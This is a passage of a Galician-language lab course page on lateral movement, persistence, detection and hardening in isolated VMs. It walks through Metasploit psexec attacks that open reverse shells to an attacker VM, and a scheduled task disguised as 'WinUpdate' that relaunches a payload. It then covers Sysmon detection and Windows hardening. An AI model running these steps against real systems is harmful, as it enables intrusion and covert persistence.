<p>Isto desactiva o firewall de Windows para todos os perf\u00eds. \u00datil para asegurar que nada bloquea <code>SMB</code>, <code>psexec</code>, ou conexi\u00f3ns remotas.</p> <p>Nota: Estes cambios reducen significativamente a seguridade do sistema. \u00dasaos s\u00f3 en contornas de laboratorio ou m\u00e1quinas illadas.</p>"},{"location":"ud4/viper/#execucion-dende-vm-1-msfconsole-viper_1","title":"Execuci\u00f3n dende <code>VM-1</code> (msfconsole - VIPER)","text":"<pre><code>use exploit/windows/smb/psexec\nset RHOSTS 192.168.120.102\nset SMBUser usuario\nset SMBPass abc123.\nset LHOST 192.168.120.100\nset LPORT 5555\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nrun\n</code></pre>"},{"location":"ud4/viper/#paso-4-verificar-acceso-a-vm-3","title":"Paso 4: Verificar Acceso \u00e1 <code>VM-3</code>","text":""},{"location":"ud4/viper/#execucion-dende-vm-1-msfconsole-viper_2","title":"Execuci\u00f3n dende <code>VM-1</code> (msfconsole - VIPER)","text":"<pre><code>background\nsessions -l\nsessions -i &lt;ID_da_sesi\u00f3n_de_VM-3&gt;\n</code></pre> <p>Podemos acceder tam\u00e9n por interface gr\u00e1fica de VIPER:  </p> <p></p> <p> </p>"},{"location":"ud4/viper/#exemplo-3-persistencia","title":"Exemplo 3: Persistencia","text":"<p>Prerrequisito: Facer Exemplo1 e Exemplo2</p> <p>Imos establecer unha persistencia en Windows 10 tras obter unha sesi\u00f3n <code>meterpreter</code> con <code>psexec</code>. A persistencia permite reconexi\u00f3n autom\u00e1tica tras reinicios mediante unha tarefa programada.</p> <p></p>"},{"location":"ud4/viper/#persistencia-en-windows-con-metasploit-tras-acceso-con-psexec","title":"Persistencia en Windows con Metasploit tras acceso con psexec","text":""},{"location":"ud4/viper/#paso-1-acceder-a-maquina-vitima-con-psexec","title":"Paso 1: Acceder \u00e1 m\u00e1quina v\u00edtima con <code>psexec</code>","text":"<pre><code>use exploit/windows/smb/psexec\nset RHOSTS 192.168.120.102\nset SMBUser usuario\nset SMBPass abc123.\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST 192.168.120.100\nset LPORT 5555   \nrun\n</code></pre>"},{"location":"ud4/viper/#paso-2-poner-a-sesion-meterpreter-en-background","title":"Paso 2: Po\u00f1er a sesi\u00f3n <code>meterpreter</code> en background","text":"<pre><code>meterpreter &gt; background\n</code></pre>"},{"location":"ud4/viper/#paso-3-iniciar-un-multihandler-para-recibir-a-persistencia","title":"Paso 3: Iniciar un <code>multi/handler</code> para recibir a persistencia","text":"<p>Dende a lapela Msfconsole</p> <pre><code>use exploit/multi/handler\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST 192.168.120.100\nset LPORT 6666\nset ExitOnSession false\nrun\n</code></pre> <p></p>"},{"location":"ud4/viper/#paso-4-xerar-o-payload-para-persistencia","title":"Paso 4: Xerar o payload para persistencia","text":"<ul> <li>No Dashboard de VIPER, vai \u00e1 secci\u00f3n de <code>Handler&amp;Payload</code>.  </li> <li>Na secci\u00f3n de <code>Generate Payload</code>, selecciona o handler creado.  </li> <li>Elixe o formato do payload (p.ex., <code>elf</code> para Linux, <code>exe</code> para Windows).  </li> <li>Descarga o payload xerado.    </li> <li>Premer en Generate Payload para descargar o payload xerado.</li> </ul>"},{"location":"ud4/viper/#paso-5-subir-o-payload-a-vm-3-e-crear-unha-tarefa-programada-na-vitimavm-3","title":"Paso 5: Subir o payload a VM-3 e crear unha tarefa programada na v\u00edtima(VM-3)","text":"<p>Copiar no contedor docker de viper o payload en /tmp <pre><code># docker cp /home/usuario/Descargas/1744925454.exe viper-c:/tmp\n</code></pre></p> <p>Abrir na GUI unha consola dende a conexi\u00f3n establecida no porto 5555</p> <p></p> <p>Sube o ficheiro ao equipo v\u00edtima Windows <pre><code>meterpreter&gt; upload /tmp/1744925454.exe C:\\\\Users\\\\usuario\\\\\n</code></pre></p> <p></p> <p>Para garantir que unha tarefa programada se execute mesmo cando o equipo est\u00e1 en bater\u00eda, \u00e9 recomendable creala usando un ficheiro XML personalizado con configuraci\u00f3ns avanzadas.</p> <ul> <li>Crear un ficheiro <code>task.xml</code> co seguinte contido</li> </ul> <p>execute -f cmd.exe -a '/c wmic useraccount where name=\"usuario\" get sid &gt; C:\\Windows\\Temp\\sidinfo.txt' cat C:\\Windows\\Temp\\sidinfo.txt</p> <pre><code>echo '&lt;?xml version=\"1.0\" encoding=\"UTF-16\"?&gt;\n&lt;Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"&gt;\n  &lt;RegistrationInfo&gt;\n    &lt;Description&gt;Execuci\u00f3n persistente con bater\u00eda permitida&lt;/Description&gt;\n    &lt;Author&gt;Microsoft Corporation&lt;/Author&gt;\n  &lt;/RegistrationInfo&gt;\n  &lt;Triggers&gt;\n    &lt;LogonTrigger&gt;\n      &lt;Enabled&gt;true&lt;/Enabled&gt;\n    &lt;/LogonTrigger&gt;\n  &lt;/Triggers&gt;\n  &lt;Principals&gt;\n    &lt;Principal id=\"Author\"&gt;\n      &lt;UserId&gt;S-1-5-21-2901123646-3497879057-3457833120-1001&lt;/UserId&gt;\n      &lt;LogonType&gt;InteractiveToken&lt;/LogonType&gt;\n      &lt;RunLevel&gt;HighestAvailable&lt;/RunLevel&gt;\n    &lt;/Principal&gt;\n  &lt;/Principals&gt;\n  &lt;Settings&gt;\n    &lt;DisallowStartIfOnBatteries&gt;false&lt;/DisallowStartIfOnBatteries&gt;\n    &lt;StopIfGoingOnBatteries&gt;false&lt;/StopIfGoingOnBatteries&gt;\n    &lt;AllowStartOnDemand&gt;true&lt;/AllowStartOnDemand&gt;\n    &lt;StartWhenAvailable&gt;true&lt;/StartWhenAvailable&gt;\n    &lt;Enabled&gt;true&lt;/Enabled&gt;\n    &lt;Hidden&gt;false&lt;/Hidden&gt;\n  &lt;/Settings&gt;\n  &lt;Actions Context=\"Author\"&gt;\n    &lt;Exec&gt;\n      &lt;Command&gt;C:\\Windows\\Temp\\shell.exe&lt;/Command&gt;\n    &lt;/Exec&gt;\n  &lt;/Actions&gt;\n&lt;/Task&gt;' &gt; /home/usuario/Descargas/task.xml\n</code></pre> <ul> <li>Subir mediante <code>upload</code> dende <code>meterpreter</code> o ficheiro <code>task.xml</code> a <code>C:\\Users\\usuario\\task.xml</code>. Previamente debemos copiar ese ficheiro a contedor docker de viper: <pre><code># docker cp /home/usuario/Descargas/task.xml viper-c:/tmp\n</code></pre></li> </ul> <pre><code>meterpreter&gt; upload /tmp/task.xml C:\\\\Users\\\\usuario\\\\\n</code></pre> <p></p> <ul> <li>Crear a tarefa programada a partir do ficheiro</li> </ul> <pre><code>execute -f powershell.exe -a \"-Command schtasks /create /tn 'WinUpdate' /xml C:\\Users\\usuario\\task.xml\"\n</code></pre> <p> </p> <p>Esta tarefa: - Executarase ao login - Con privilexios elevados - Mesmo con bater\u00eda - Chamar\u00e1 ao ficheiro <code>payload.exe</code> especificado  </p>"},{"location":"ud4/viper/#paso-6-probar-ou-agardar-reconexion","title":"Paso 6: Probar ou agardar reconexi\u00f3n","text":"<p>Probar na sesi\u00f3n actual executando a tarefa programada: <pre><code>execute -f powershell.exe -a \"-Command schtasks /run /tn 'WinUpdate'\"\n</code></pre></p> <p> </p> <p>ou reiniciar e a sesi\u00f3n ser\u00e1 recibida no handler tras login do usuario: <pre><code>shutdown /r /t 0\n</code></pre> </p>"},{"location":"ud4/viper/#resumo","title":"Resumo","text":"<ol> <li><code>VM-2</code> (Debian) foi comprometida cun payload (<code>Meterpreter</code>).</li> <li>Realizouse Movemento Lateral dende <code>VM-2</code> cara <code>VM-3</code> sen empregar Pivoting, usando credenciais v\u00e1lidas (<code>usuario/abc123</code>).</li> <li>Obt\u00edvose acceso a <code>VM-3</code> mediante <code>psexec</code>.</li> <li>Conseguiuse persistencia mediante a subida dun payload e a creaci\u00f3n dunha tarefa programada.</li> </ol> <p>Movemento Lateral vs. Pivoting</p> <ul> <li><code>Movemento Lateral</code> \u00e9 a t\u00e9cnica de moverse dun sistema a outro dentro da mesma rede comprometida sen utilizar ning\u00fan tipo de proxy ou t\u00fanel.</li> <li><code>Pivoting</code> implica crear un proxy ou t\u00fanel para acceder a redes que non son directamente accesibles.</li> </ul> <p>Neste caso s\u00f3 se realizou Movemento Lateral, non Pivoting.</p>"},{"location":"ud4/viper/#monitorizacion-do-movemento-lateral-desde-vm-2-a-vm-3","title":"Monitorizaci\u00f3n do Movemento Lateral desde VM-2 a VM-3","text":"<p>Detecci\u00f3n de conexi\u00f3ns sospeitosas en VM-3 (Windows 10)</p> <ul> <li> <p>Uso de <code>netstat</code> para listar as conexi\u00f3ns activas e escoitando:</p> <p><pre><code>netstat -ano | findstr ESTAB\n</code></pre> </p> </li> <li> <p>Identificar procesos asociados a conexi\u00f3ns abertas con <code>tasklist</code>:</p> <p><pre><code>tasklist /FI \"PID eq &lt;PID&gt;\"\n</code></pre> </p> </li> <li> <p>Monitorizaci\u00f3n con <code>Sysmon</code>:</p> <p>Ficheiros a descargar</p> <p>Para poder descargar as ferramentas necesarias \u00e9 preciso copiar estas ferramentas en VM-3, ou darlle conexi\u00f3n a Internet a VM-3. </p> <p>Sysmon (System Monitor) \u00e9 unha ferramenta de Microsoft Sysinternals que permite rexistrar eventos de seguridade avanzados en sistemas Windows, como execuci\u00f3ns de procesos, modificaci\u00f3ns de rexistro, conexi\u00f3ns de rede, etc.</p> <p>Instalaci\u00f3n:</p> <ol> <li> <p>Descarga desde a p\u00e1xina oficial: https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon</p> </li> <li> <p>Instala cun ficheiro de configuraci\u00f3n personalizado:</p> <p>O ficheiro <code>config.xml</code> cont\u00e9n as regras que definen que eventos se rexistran. Podes usar unha configuraci\u00f3n xa feita (como a de SwiftOnSecurity) ou crear a t\u00faa.  <pre><code>PS C:\\Users\\usuario\\Sysmon&gt; iwr \"https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml\" -OutFile \"config.xml\"\n</code></pre></p> <pre><code>sysmon -accepteula -i config.xml\n</code></pre> <p></p> </li> <li> <p>Sysmon e o Visor de Eventos</p> <p>Podes visualizar os eventos de Sysmon usando a interface gr\u00e1fica de Windows:</p> <p>A. Abre o Event Viewer (preme <code>Win + R</code>, escribe <code>eventvwr</code> e preme Enter).  B. No panel esquerdo, navega a: Visor de eventos \u2192 Registros de aplicaci\u00f3ns e servizos \u2192 Microsoft \u2192 Windows \u2192 Sysmon \u2192 Operational </p> <p>Podes aplicar filtros ou gardar vistas personalizadas para centrarte en tipos concretos de eventos, como execuci\u00f3n de procesos, cambios en rexistro, ou tr\u00e1fico de rede sospeitoso.</p> </li> <li> <p>Visualizar movemento lateral con Sysmon no Visor de Eventos</p> <p>Eventos clave que delatan movemento lateral:</p> Evento Sysmon Descrici\u00f3n Indicio de movemento lateral <code>1</code> Creaci\u00f3n de proceso Execuci\u00f3n de <code>psexec.exe</code>, <code>cmd.exe</code>, <code>schtasks.exe</code>, <code>payload.exe</code> <code>3</code> Conexi\u00f3n de rede Conexi\u00f3ns a portos <code>445</code>, <code>135</code>, <code>5555</code>, <code>6666</code> <code>11</code> Acceso a ficheiros Copia ou execuci\u00f3n en <code>Temp</code>, <code>AppData</code>, etc. <code>13</code>, <code>14</code> Cambios no rexistro Rexistro de execuci\u00f3ns autom\u00e1ticas (<code>Run</code>, <code>RunOnce</code>) <p>Exemplo 1: Detectar reconexi\u00f3n con VIPER</p> <ol> <li>Abre o Visor de Eventos</li> <li>Vai a <code>Sysmon &gt; Operational</code></li> <li> <p>Buscar por: </p> <ul> <li>Porto de conexi\u00f3n a VIPER: 6666 \u2192 Evento <code>3</code> </li> <li>Conexi\u00f3n de sa\u00edda a <code>192.168.120.100</code> (VIPER) \u2192 Evento <code>3</code> </li> <li>Execuci\u00f3n de <code>payload.exe</code> \u2192 Eventos <code>1</code> e <code>3</code> </li> </ul> </li> </ol> <p>Exemplo 2: Detectar executables en execuci\u00f3n</p> <ol> <li>Abre o Visor de Eventos</li> <li>Vai a <code>Sysmon &gt; Operational</code></li> <li> <p>Buscar por: </p> <ul> <li>Executables <code>.exe</code> \u2192 Evento <code>1</code> </li> </ul> </li> </ol> <p>Exemplo 3: Execuci\u00f3n de tarefa programada con persistencia</p> <p>Detectar execuci\u00f3n de tarefas programadas con Sysmon</p> <p>Para detectar cando se executa <code>schtasks.exe</code>, podes engadir unha regra personalizada no ficheiro <code>config.xml</code> de Sysmon.</p> <p>Regra engadida</p> <p>Esta regra debe inclu\u00edrse no ficheiro <code>config.xml</code> dentro dunha nova secci\u00f3n <code>ProcessCreate onmatch=\"include\"</code>, despois da regra actual <code>onmatch=\"exclude\"</code>:</p> <pre><code>&lt;!-- Custom rule: Detect execuci\u00f3n de tarefas programadas --&gt;\n&lt;ProcessCreate onmatch=\"include\"&gt;\n  &lt;Image condition=\"end with\"&gt;schtasks.exe&lt;/Image&gt;\n&lt;/ProcessCreate&gt;\n</code></pre> <p>Aplicar a nova configuraci\u00f3n en Sysmon</p> <pre><code>sysmon.exe -c config.xml\n</code></pre> <p>A partir dese momento, cada execuci\u00f3n de <code>schtasks.exe</code> aparecer\u00e1 como evento ID 1 (ProcessCreate) no log <code>Microsoft-Windows-Sysmon/Operational</code>. As\u00ed, eliminamos a tarefa programada e xeramos de novo a tarefa programada, polo que ambas acci\u00f3ns ser\u00e1n rexistradas en sysmon.</p> <pre><code>schtasks /delete /tn \"WinUpdate\" /f\nschtasks /create /tn \"WinUpdate\" /xml C:\\Users\\usuario\\task.xml\n</code></pre> <p>Execuci\u00f3n de tarefas programadas</p> <p>Se provocamos un reinicio como comando <code>shutdown /r /t 0</code> para que ao iniciar sesi\u00f3n co usuario exec\u00fatese a tarefa programada esta acci\u00f3n non ser\u00e1 \"capturada\" por <code>sysmon</code> xa que <code>schtasks.es</code> soamente dispara eventos na eliminaci\u00f3n/creaci\u00f3n de tarefas e non na execuci\u00f3n destas.</p> <p>Isto \u00e9 \u00fatil para identificar persistencia baseada en tarefas programadas no contexto dun movemento lateral ou post-explotaci\u00f3n.</p> <ol> <li>Abre o Visor de Eventos</li> <li>Vai a <code>Sysmon &gt; Operational</code></li> <li> <p>Buscar por: </p> <ul> <li> <p>schtasks \u2192 Evento <code>1</code> </p> </li> <li> <p>svchost.exe -k netsvcs -p -s Schedule \u2192 Evento <code>1</code> </p> </li> </ul> <p>Filtrar po ID:</p> <ul> <li> <p>Evento <code>11</code>: Execuci\u00f3n ou acceso a tarefa programada persistente     </p> <p>Eventos <code>13</code>/<code>14</code> para entradas no rexistro (Run key)</p> </li> </ul> </li> </ol> </li> </ol> </li> <li> <p>Uso de wevtutil para consultar eventos</p> <p><code>wevtutil</code> \u00e9 unha ferramenta de li\u00f1a de comandos integrada en Windows que permite consultar, exportar e xestionar logs de eventos do sistema.  <code>wevtutil</code> xa v\u00e9n preinstalado en todas as versi\u00f3ns modernas de Windows, non \u00e9 necesario instalar nada adicional.</p> <p>Para consultar os eventos de Sysmon directamente:</p> <p><pre><code>wevtutil qe Microsoft-Windows-Sysmon/Operational /rd:true /f:text | more\n</code></pre> </p> <p>Para exportar os eventos a un ficheiro <code>.evtx</code>:</p> <pre><code>wevtutil epl Microsoft-Windows-Sysmon/Operational sysmon_log.evtx\n</code></pre> </li> </ul>"},{"location":"ud4/viper/#bastionado-e-mitigacion-da-vm-3-windows-10","title":"Bastionado e mitigaci\u00f3n da VM-3 (Windows 10)","text":"<p>Activar UAC e Firewall en Windows (modo produci\u00f3n)</p> <p>Para contornas de proba ou laboratorio, anteriormente, desactivamos o UAC e o firewall de Windows 10. Para a contorna de produci\u00f3n deberiamos activalos cos seguintes comandos. Executa o terminal como administrador.</p> <p>Activar UAC (User Account Control):</p> <pre><code>reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v EnableLUA /t REG_DWORD /d 1 /f\nshutdown /r /t 0\n</code></pre> <p>Isto modifica o rexistro para activar completamente o UAC. Requ\u00edrese reinicio.</p> <p>Activar o firewall en todos os perf\u00eds (dominio, privado, p\u00fablico):</p> <pre><code>netsh advfirewall set allprofiles state on\n</code></pre> <p>Isto activa o firewall de Windows para todos os perf\u00eds. \u00datil para asegurar o bloqueo <code>SMB</code>, <code>psexec</code>, ou conexi\u00f3ns remotas.</p> <p>Nota: Estes cambios aumentan significativamente a seguridade do sistema. \u00dasaos sempre, a non ser, que queiras traballar sen estas medidas de seguridade en contornas de laboratorio ou m\u00e1quinas illadas.</p>"},{"location":"ud4/viper/#configuracion-de-firewall-para-bloquear-movemento-lateral","title":"Configuraci\u00f3n de Firewall para bloquear movemento lateral","text":"<pre><code>netsh advfirewall set allprofiles state on\nnetsh advfirewall firewall add rule name=\"Block Lateral Movement\" protocol=TCP dir=IN localport=445,135,139 action=block\nnetsh advfirewall firewall add rule name=\"Block Lateral Movement\" protocol=TCP dir=OUT localport=445,135,139 action=block\nnetsh advfirewall show allprofiles\n</code></pre> <p>Comprobando en VM-1 (Viper)</p> <pre><code>msf6 exploit(windows/smb/psexec) &gt; run\n[*] Started reverse TCP handler on 192.168.120.100:5555 \n[*] 192.168.120.102:445 - Connecting to the server...\n[-] 192.168.120.102:445 - Exploit failed [unreachable]: Rex::ConnectionTimeout The connection with (192.168.120.102:445) timed out.\n[*] Exploit completed, but no session was created.\n msf6 exploit(windows/smb/psexec) &gt; \n</code></pre>"},{"location":"ud4/viper/#hardenizacion-de-servizos-windows","title":"Hardenizaci\u00f3n de Servizos Windows","text":"<ul> <li>Desactivar SMBv1 (protocolo obsoleto e vulnerable): <pre><code>sc.exe config lanmanworkstation depend= bowser/mrxsmb20/nsi\ndism /online /disable-feature /featurename:SMB1Protocol\n</code></pre></li> <li> <p>Desactivar completamente o acceso por Escritorio Remoto (RDP) ao sistema: <pre><code>reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 1 /f\n</code></pre></p> </li> <li> <p>Activar Control de Contas de Usuario (UAC): Requ\u00edrese reinicio <pre><code>reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v EnableLUA /t REG_DWORD /d 1 /f\n</code></pre>      E para garantir que o sistema sempre mostre o aviso UAC ao usuario, a\u00ednda que o usuario sexa <code>administrador</code>, requirindo confirmaci\u00f3n manual para evitar execuci\u00f3ns autom\u00e1ticas ou ocultas con privilexios:      <pre><code>reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 2 /f\n</code></pre></p> </li> </ul> <p>Panel de control\\Sistema y seguridad\\Seguridad y mantenimiento</p> <ul> <li>Panel de control\\Sistema y seguridad\\Seguridad y mantenimiento\\Cambiar la configuraci\u00f3n de Seguridad y mantenimiento </li> <li>Cambiar configuraci\u00f3n de Control de cuentas de usuario </li> </ul> <p>Comprobando en VM-1 (Viper) tras reiniciar VM-3</p> <p>Agora non se crea a <code>Reverse Shell: meterpreter</code> a trav\u00e9s do porto TCP 6666</p>"},{"location":"ud4/viper/#aplicar-politicas-de-seguridade-mediante-gpeditmsc","title":"Aplicar Pol\u00edticas de Seguridade mediante <code>gpedit.msc</code>","text":"<ul> <li> <p>Desactivar autenticaci\u00f3ns d\u00e9biles (LM, NTLMv1) e aplicar restricci\u00f3ns \u00e1 autenticaci\u00f3n NTLM:</p> <ol> <li>Presionar <code>Win + R</code> e escribir <code>gpedit.msc</code>.</li> <li>Navegar a: <code>Configuraci\u00f3n del equipo &gt; Configuraci\u00f3n de Windows &gt; Configuraci\u00f3n de seguridad &gt; Directivas locales &gt; Opciones de seguridad</code>.</li> <li>Desactivar LM e NTLMv1:<ul> <li>Configurar <code>Seguridad de red: Nivel de autenticaci\u00f3n de LAN Manager</code> como <code>Enviar solo respuesta NTLMv2 y rechazar LM y NTLM</code>.</li> </ul> </li> <li>Restrinxir NTLM:<ul> <li>Configurar <code>Seguridad de red: Restringir NTLM: Tr\u00e1fico NTLM entrante</code> como <code>Denegar todas las cuentas</code>.</li> <li>Configurar <code>Seguridad de red: Restringir NTLM: Tr\u00e1fico NTLM saliente a servidores remotos</code> como <code>Denegar todo</code>.</li> </ul> </li> <li>Reiniciar o sistema para aplicar os cambios.</li> </ol> </li> <li> <p>Configurar permisos de acceso local e remoto soamente para usuarios autorizados:</p> <ol> <li>Presionar <code>Win + R</code> e escribir <code>gpedit.msc</code>.</li> <li>Navegar a: <code>Configuraci\u00f3n del equipo &gt; Configuraci\u00f3n de Windows &gt; Configuraci\u00f3n de seguridad &gt; Directivas locales &gt; Asignaci\u00f3n de derechos de usuario</code>.</li> <li>Configurar as pol\u00edticas:<ul> <li><code>Permitir el inicio de sesi\u00f3n local</code>: Agregar soamente os usuarios que necesitan acceso f\u00edsico ao sistema.</li> <li><code>Permitir inicio de sesi\u00f3n a trav\u00e9s de Servicios de Escritorio Remoto</code>: Agregar soamente os usuarios ou grupos autorizados para acceso remoto.</li> <li><code>Denegar el inicio de sesi\u00f3n local</code> e <code>Denegar inicio de sesi\u00f3n a trav\u00e9s de Servicios de Escritorio Remoto</code>: Agregar usuarios non autorizados.</li> </ul> </li> <li>Reiniciar o sistema para aplicar os cambios.</li> </ol> </li> </ul> <p>En <code>Directivas Locales</code>: A denegaci\u00f3n de inicio de sesi\u00f3n prevalece sobre o permiso</p> <p>En Windows, cando se configuran as pol\u00edticas de inicio de sesi\u00f3n local ou remoto mediante <code>gpedit.msc</code>, \u00e9 posible que un mesmo usuario ou grupo figure tanto nas directivas de permiso como nas de denegaci\u00f3n. Neste caso, a pol\u00edtica de denegaci\u00f3n sempre prevalece.</p> <p>Exemplo</p> <p>Se o usuario <code>invitado</code> est\u00e1 configurado as\u00ed:</p> <ul> <li><code>Permitir el inicio de sesi\u00f3n a trav\u00e9s de Servicios de Escritorio Remoto</code></li> <li><code>Denegar el inicio de sesi\u00f3n a trav\u00e9s de Servicios de Escritorio Remoto</code></li> </ul> <p>Resultado: <code>invitado</code> non poder\u00e1 acceder por Escritorio Remoto, porque a pol\u00edtica de denegaci\u00f3n ten prioridade.</p> <p>Isto permite aos administradores crear excepci\u00f3ns ou restrici\u00f3ns espec\u00edficas, mesmo se o usuario est\u00e1 nun grupo con acceso.</p>"},{"location":"ud4/viper/#monitoreo-continuo-con-auditpol","title":"Monitoreo Continuo con <code>Auditpol</code>","text":"<p>Que \u00e9 auditpol?</p> <p><code>auditpol</code> \u00e9 unha ferramenta de li\u00f1a de comandos inclu\u00edda en sistemas operativos Windows que permite consultar e configurar as pol\u00edticas de auditor\u00eda de seguridade do sistema.</p> <p>Estas pol\u00edticas definen que tipos de eventos se rexistran no Visor de Eventos, como: - Logons e logoffs - Cambios en contas de usuario ou privilexios - Acceso a obxectos sensibles (ficheiros, rexistro...)  </p> <p><code>auditpol</code> \u00e9 especialmente \u00fatil para garantir que o sistema cumpre con pol\u00edticas de seguridade e auditor\u00eda, e para detectar cambios non autorizados ou an\u00f3malos nas configuraci\u00f3ns de control de eventos.</p> <pre><code>auditpol /get /category:* &gt; C:\\audit-settings_%date:~6,4%-%date:~3,2%-%date:~0,2%_%time:~0,2%-%time:~3,2%.txt\n</code></pre> <p>Este comando realiza o seguinte:    - Exporta todas as configuraci\u00f3ns de auditor\u00eda actuais do sistema.    - G\u00e1rdaas nun ficheiro de texto cuxo nome incl\u00fae a data e a hora no formato <code>YYYY-MM-DD_HH-MM</code>.    - Este m\u00e9todo permite ter un rexistro hist\u00f3rico de cambios na configuraci\u00f3n de auditor\u00eda ao longo do tempo.</p> <p>Exemplo de ficheiro xerado: <code>audit-settings_2025-04-18_18-37.txt</code></p> <p>Recomendaci\u00f3n: Executar este comando regularmente e comparar as configuraci\u00f3ns antigas coas actuais para detectar modificaci\u00f3ns non autorizadas.</p> <ol> <li> <p>An\u00e1lise da configuraci\u00f3n de auditor\u00eda do sistema con auditpol</p> <p>O ficheiro xerado por <code>auditpol /get /category:*</code> mostra que eventos de seguridade est\u00e1n sendo rexistrados actualmente en Windows. Isto \u00e9 fundamental para saber se o sistema est\u00e1 preparado para detectar acci\u00f3ns sospeitosas como movemento lateral ou persistencia.</p> <pre><code>    C:\\Users\\usuario&gt;more c:\\audit-settings_2025-04-18_18-37.txt\n    Directiva de auditor\u00eda del sistema\n    Categor\u00eda o subcategor\u00eda                  Configuraci\u00f3n\n    Sistema\n      Extensi\u00f3n del sistema de seguridad      Sin auditor\u00eda\n      Integridad del sistema                  Aciertos y errores\n      Controlador IPsec                       Sin auditor\u00eda\n      Otros eventos de sistema                Aciertos y errores\n      Cambio de estado de seguridad           Aciertos\n    Inicio/cierre de sesi\u00f3n\n      Inicio de sesi\u00f3n                        Aciertos y errores\n      Cerrar sesi\u00f3n                           Aciertos\n      Bloqueo de cuenta                       Aciertos\n      Modo principal de IPsec                 Sin auditor\u00eda\n      Modo r\u00e1pido de IPsec                    Sin auditor\u00eda\n      Modo extendido de IPsec                 Sin auditor\u00eda\n      Inicio de sesi\u00f3n especial               Aciertos\n      Otros eventos de inicio y cierre de sesi\u00f3nSin auditor\u00eda\n      Servidor de directivas de redes         Aciertos y errores\n      Notificaciones de usuario o dispositivo Sin auditor\u00eda\n      Pertenencia a grupos                    Sin auditor\u00eda\n    Acceso de objetos\n      Sistema de archivos                     Sin auditor\u00eda\n      Registro                                Sin auditor\u00eda\n      Objeto de kernel                        Sin auditor\u00eda\n      SAM                                     Sin auditor\u00eda\n      Servicios de certificaci\u00f3n              Sin auditor\u00eda\n      Aplicaci\u00f3n generada                     Sin auditor\u00eda\n      Manipulaci\u00f3n de identificadores         Sin auditor\u00eda\n      Recurso compartido de archivos          Sin auditor\u00eda\n      Colocaci\u00f3n de paquetes de Plataforma de filtradoSin auditor\u00eda\n      Conexi\u00f3n de Plataforma de filtrado      Sin auditor\u00eda\n      Otros eventos de acceso a objetos       Sin auditor\u00eda\n      Recurso compartido de archivos detalladoSin auditor\u00eda\n      Almacenamiento extra\u00edble                Sin auditor\u00eda\n      Almacenamiento provisional de directiva centralSin auditor\u00eda\n    Uso de privilegios\n      Uso de privilegio no confidencial       Sin auditor\u00eda\n      Otros eventos de uso de privilegio      Sin auditor\u00eda\n      Uso de privilegio confidencial          Sin auditor\u00eda\n    Seguimiento detallado\n      Creaci\u00f3n del proceso                    Sin auditor\u00eda\n      Finalizaci\u00f3n del proceso                Sin auditor\u00eda\n      Actividad DPAPI                         Sin auditor\u00eda\n      Eventos de RPC                          Sin auditor\u00eda\n      Eventos Plug and Play                   Sin auditor\u00eda\n      Eventos de ajuste de derecho de token   Sin auditor\u00eda\n    Cambio de plan\n      Cambio en la directiva de auditor\u00eda     Aciertos\n      Cambio de la directiva de autenticaci\u00f3n Aciertos\n      Cambio de la directiva de autorizaci\u00f3n  Sin auditor\u00eda\n      Cambio de la directiva del nivel de reglas de MPSSVCSin auditor\u00eda\n      Cambio de la directiva de Plataforma de filtradoSin auditor\u00eda\n      Otros eventos de cambio de directivas   Sin auditor\u00eda\n    Administraci\u00f3n de cuentas\n      Administraci\u00f3n de cuentas de equipo     Sin auditor\u00eda\n      Administraci\u00f3n de grupos de seguridad   Aciertos\n      Administraci\u00f3n de grupos de distribuci\u00f3nSin auditor\u00eda\n      Administraci\u00f3n de grupos de aplicacionesSin auditor\u00eda\n      Otros eventos de administraci\u00f3n de cuentasSin auditor\u00eda\n      Administraci\u00f3n de cuentas de usuario    Aciertos\n    Acceso DS\n      Acceso del servicio de directorio       Sin auditor\u00eda\n      Cambios de servicio de directorio       Sin auditor\u00eda\n      Replicaci\u00f3n de servicio de directorio   Sin auditor\u00eda\n      Replicaci\u00f3n de servicio de directorio detalladaSin auditor\u00eda\n    Inicio de sesi\u00f3n de la cuenta\n      Operaciones de vales de servicio KerberosSin auditor\u00eda\n      Otros eventos de inicio de sesi\u00f3n de cuentasSin auditor\u00eda\n      Servicio de autenticaci\u00f3n Kerberos      Sin auditor\u00eda\n      Validaci\u00f3n de credenciales              Sin auditor\u00eda\n</code></pre> <p>Que est\u00e1 ben configurado neste sistema</p> <ul> <li>Integridade do sistema: rex\u00edstranse acertos e erros \u2192 \u00fatil para cambios no n\u00facleo.</li> <li>Inicio e peche de sesi\u00f3n: rex\u00edstranse logins exitosos e fallidos.</li> <li>Administraci\u00f3n de contas: cambios en usuarios e grupos son rexistrados.</li> <li>Cambios na pol\u00edtica de seguridade: activado.</li> </ul> <p>Problemas detectados (auditor\u00eda desactivada)</p> <ul> <li>Creaci\u00f3n de procesos (<code>Creaci\u00f3n del proceso</code>): sen rexistro \u2192 cr\u00edtico para detectar execuci\u00f3n de binarios.</li> <li>Acceso a obxectos (rexistro, ficheiros, SAM, etc.): todo est\u00e1 en \u201cSen auditor\u00eda\u201d.</li> <li>Uso de privilexios sensibles (<code>SeDebugPrivilege</code>, etc.): sen rexistro.</li> <li>Seguimento detallado en xeral: desactivado \u2192 impide detecci\u00f3n forense completa.</li> </ul> <p>Conclusi\u00f3n</p> <p>Esta configuraci\u00f3n \u00e9 m\u00ednima pero funcional para logins e cambios de contas, pero non detectar\u00e1 execuci\u00f3ns de ferramentas como <code>schtasks.exe</code>, <code>cmd.exe</code>, <code>payload.exe</code>, etc.. Para visibilidade completa, recom\u00e9ndase:</p> <ol> <li> <p>Activar auditor\u00eda de creaci\u00f3n de procesos</p> <pre><code>auditpol /set /subcategory:\"Creaci\u00f3n del proceso\" /success:enable /failure:enable\n</code></pre> <p>Isto permite rexistrar cada proceso novo lanzado no sistema, \u00fatil para detectar execuci\u00f3ns de ferramentas como <code>cmd.exe</code>, <code>powershell.exe</code>, 